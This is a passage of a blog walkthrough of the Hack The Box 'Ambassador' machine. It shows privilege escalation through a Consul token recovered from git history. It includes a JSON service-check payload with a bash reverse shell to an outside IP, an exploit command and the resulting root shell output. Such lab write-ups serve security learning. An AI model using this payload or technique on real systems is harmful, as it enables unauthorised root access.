+</span></span></code></pre></td></tr></table></div></div><p>This led me to wonder if i could create my own token to pass to the API. Unfortunately I lacked acl:write permission. I tried a few different JSON payloads in curl against /v1/agent/check/register, including &ldquo;script&rdquo;, with a reverse shell but nothing seemed to work. I also tried <code>consul acl token list</code> thinking perhaps the developer user had more access to consul than a HTTP request, but didn&rsquo;t have acl:read either. My access was very restricted :(</p><p>Searching the file system for consul, I found a bash script in a directory for an app that looks familiar (whackywidget):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>developer@ambassador:/opt$ find / -name <span class=s1>&#39;*consul*&#39;</span> 2&gt; /dev/null
+</span></span><span class=line><span class=cl>..snip..
+</span></span><span class=line><span class=cl>/opt/consul
+</span></span><span class=line><span class=cl>/opt/my-app/whackywidget/put-config-in-consul.sh
+</span></span><span class=line><span class=cl>/usr/lib/systemd/system/consul.service
+</span></span><span class=line><span class=cl>/usr/bin/consul
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>developer@ambassador:/opt$ cat /opt/my-app/whackywidget/put-config-in-consul.sh 
+</span></span><span class=line><span class=cl><span class=c1># We use Consul for application config in production, this script will help set the correct values for the app</span>
+</span></span><span class=line><span class=cl><span class=c1># Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>consul kv put whackywidget/db/mysql_pw <span class=nv>$MYSQL_PASSWORD</span>
+</span></span></code></pre></td></tr></table></div></div><p>So <code>CONSUL_HTTP_TOKEN</code> needs to be set, and searching the file system yielded nothing.</p><p>I noticed in <code>/opt/my-app/</code> a .git directory. Running a <code>git log -p</code> to show the commit diffs against this repository, I found:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span></span><span class=line><span class=cl>+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+</span></span></code></pre></td></tr></table></div></div><p>The developer had clearly hard-coded their Consul token, realised their mistake, and removed it &ndash; while forgetting the token was still accessible via git commit logs.</p><p>I found the following python script to do RCE over Consul API with a valid token: <a href=https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py target=_blank rel="noopener noreffer">Hashicorp-Consul-RCE-via-API/exploit.py at main · GatoGamer1155/Hashicorp-Consul-RCE-via-API · GitHub</a></p><p>This appears to <code>PUT /v1/agent/service/register</code>, with a JSON payload similar to:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;Address&#34;</span><span class=p>:</span> <span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&#34;check&#34;</span><span class=p>:</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=err>{</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;Args&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#34;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;interval&#34;</span><span class=p>:</span> <span class=s2>&#34;10s&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nt>&#34;Timeout&#34;</span><span class=p>:</span> <span class=s2>&#34;864000s&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=err>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>The consul documentation outlines the service check register API here: <a href=https://developer.hashicorp.com/consul/api-docs/agent/service#check target=_blank rel="noopener noreffer">Service - Agent - HTTP API | Consul | HashiCorp Developer</a></p><p>Basically, given our consul token we obtained via git, we can register a service check on the consul agent that will run a periodic script. In this case, we run a reverse shell connecting back out to our locally running netcat instance.</p><p>Let&rsquo;s try it out:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 consule_rce.py --lhost 10.10.14.48 --lport <span class=m>3322</span> --rhost 127.0.0.1 --rport <span class=m>8500</span> --token bb03b43b-1d81-d62b-24b5-39540ee469b5
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Request sent successfully, check your listener
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>3322</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.48<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.183<span class=o>]</span> <span class=m>60742</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>3858<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>root@ambassador:/# cat /root/root.txt
+</span></span><span class=line><span class=cl>cat /root/root.txt
+</span></span><span class=line><span class=cl>db59b71542a934db27b28462577febcd
+</span></span></code></pre></td></tr></table></div></div><p>As expected, the consul agent, running as root, spawns a shell connecting back to my listening netcat instance giving me a root shell.</p><p>And with that, we have the root flag! Woo!</p><h2 id=conclusion>Conclusion</h2><p>The most difficult part for this challenge was the privilege escalation &ndash; luckily consul seemed like the first (and only?) obvious process running as root that could be exploitable &ndash; so it was the clear first choice for investigating privesc. Uncovering the bash script was easy, but I stumbled a little before finding the git logs to get the token I could use with the API. After this, registering a &ldquo;service&rdquo; to give me a reverse shell was quite easy.</p><p>A fun VM, but perhaps easier than I expected for Medium difficulty. I&rsquo;m interested to see how challenging the next one is. I had not thought to find and check the logs of github repositories on compromised machines before, so this has been added to my arsenal of things to look out for and enumerate.</p><p>The temptation often is to break out LinPEAS and just scan, but getting a &lsquo;feel&rsquo; for a server &ndash; what does it appear to be used for? what story does it tell? and what kind of things should I be looking for? &ndash; and enumerating on a case by case basis seems to be a nicer way to narrow down the possibilities without being overwhelmed by all the potentials of enumerating many things at once.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-01-29&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/a9fa6a0c3dd94a1ef6bd4f080af8b555a8a77508 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) a9fa6a0c3dd94a1ef6bd4f080af8b555a8a77508: add ambassador HTB walkthrough">
+<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>a9fa6a0</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-01-28-ambassador-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-01-28-ambassador-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-01-28-ambassador-htb/ data-title="Ambassador HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-01-28-ambassador-htb/ data-title="Ambassador HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-01-28-ambassador-htb/ data-title="Ambassador HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/pentesting/>pentesting</a>,&nbsp;<a href=/tags/infosec/>infosec</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/consul/>consul</a>,&nbsp;<a href=/tags/grafana/>grafana</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-01-14-shoppy-htb/ class=prev rel=prev title="Shoppy HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Shoppy HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
